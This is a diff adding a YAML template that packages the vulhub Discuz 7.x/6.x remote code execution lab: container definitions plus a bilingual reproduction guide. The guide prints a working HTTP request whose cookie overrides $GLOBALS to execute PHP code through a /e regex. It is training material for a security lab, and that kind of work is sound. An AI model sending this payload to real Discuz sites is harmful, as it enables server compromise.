@@ -1,0 +1,117 @@
+apiVersion: hivora/v1
+kind: Template
+metadata:
+  slug: vulhub-discuz-wooyun-2010-080723
+  name: Discuz 7.x/6.x Remote Code Execution via Global Variable Override
+  version: 1.0.0
+  category: security-lab
+  tags:
+  - vulhub
+  - discuz
+  description: Discuz! — Discuz 7.x/6.x Remote Code Execution via Global Variable Override (vulhub).
+  links:
+    site: https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723
+  maintainer: vulhub
+  license: MIT (vulhub)
+  source: https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723
+  lab:
+    phase: exploitation
+    cves: []
+    os:
+    - linux
+    tech:
+    - discuz
+    - rce
+    difficulty: medium
+    summary: Discuz 7.x/6.x Remote Code Execution via Global Variable Override
+    solution:
+      fr: |
+        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723
+        Discuz is a popular forum software widely used in China. A remote code execution vulnerability exists in Discuz 7.x/6.x versions due to insufficient global variable protection.
+        In PHP 5.3.x, the default value of `request_order` in php.ini is set to "GP", which means `$_REQUEST` no longer includes `$_COOKIE` by default. This allows attackers to override global variables through cookies by injecting `$GLOBALS`, leading to remote code execution.
+        References:
+        - <https://www.secpulse.com/archives/2338.html>
+        # Environment Setup
+        Execute the following command to start Discuz 7.2:
+        $ docker compose up -d
+        After starting the container, visit `http://your-ip:8080/install/` to install Discuz. Use the following database settings:
+        - Database Host: `db`
+        - Database Name: `discuz`
+        - Username: `root`
+        - Password: `root`
+        # Vulnerability Reproduction
+        After installation, find an existing post and send a request with the following cookie that contains the payload `GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();`:
+        $ GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
+        $ Host: your-ip:8080
+        $ Accept-Encoding: gzip, deflate
+        $ Accept: */*
+        $ Accept-Language: en
+        $ User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+        $ Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+        $ Connection: close
+        The `phpinfo()` function will be successfully executed, demonstrating the remote code execution vulnerability:
+        > Note: Some articles online claim that a post with an emoji comment is required, but the actual test found that it was not necessary, and the reason still needs to be analyzed from the code.
+      en: |
+        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723
+        Discuz is a popular forum software widely used in China. A remote code execution vulnerability exists in Discuz 7.x/6.x versions due to insufficient global variable protection.
+        In PHP 5.3.x, the default value of `request_order` in php.ini is set to "GP", which means `$_REQUEST` no longer includes `$_COOKIE` by default. This allows attackers to override global variables through cookies by injecting `$GLOBALS`, leading to remote code execution.
+        References:
+        - <https://www.secpulse.com/archives/2338.html>
+        # Environment Setup
+        Execute the following command to start Discuz 7.2:
+        $ docker compose up -d
+        After starting the container, visit `http://your-ip:8080/install/` to install Discuz. Use the following database settings:
+        - Database Host: `db`
+        - Database Name: `discuz`
+        - Username: `root`
+        - Password: `root`
+        # Vulnerability Reproduction
+        After installation, find an existing post and send a request with the following cookie that contains the payload `GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();`:
+        $ GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
+        $ Host: your-ip:8080
+        $ Accept-Encoding: gzip, deflate
+        $ Accept: */*
+        $ Accept-Language: en
+        $ User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+        $ Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+        $ Connection: close
+        The `phpinfo()` function will be successfully executed, demonstrating the remote code execution vulnerability:
+        > Note: Some articles online claim that a post with an emoji comment is required, but the actual test found that it was not necessary, and the reason still needs to be analyzed from the code.
+requirements:
+  arch:
+  - amd64
+form:
+  basic:
+  - id: port_80
+    group:
+      fr: Accès
+      en: Access
+    label: discuz 80/tcp
+    type: port
+    default: 8080
+services:
+  discuz:
+    role: main
+    image: vulhub/discuz
+    tag: 7.2@sha256:f09fa4fad495873741c9542b8681ea21f5ca796999c4172fc5df1539d206ad17
+    frozen: true
+    depends_on:
+    - db
+    ports:
+    - container: 80
+      host: '{{ form.port_80 }}'
+      protocol: tcp
+      purpose: web
+      exposure: lan
+  db:
+    role: database
+    image: mysql
+    tag: 5.5@sha256:12da85ab88aedfdf39455872fb044f607c32fdc233cd59f1d26769fbf439b045
+    frozen: true
+    env:
+      MYSQL_ROOT_PASSWORD: root
+      MYSQL_DATABASE: discuz
+update:
+  strategy: manual
+access:
+  web: http://{{ host.lan_ip }}:{{ form.port_80 }}
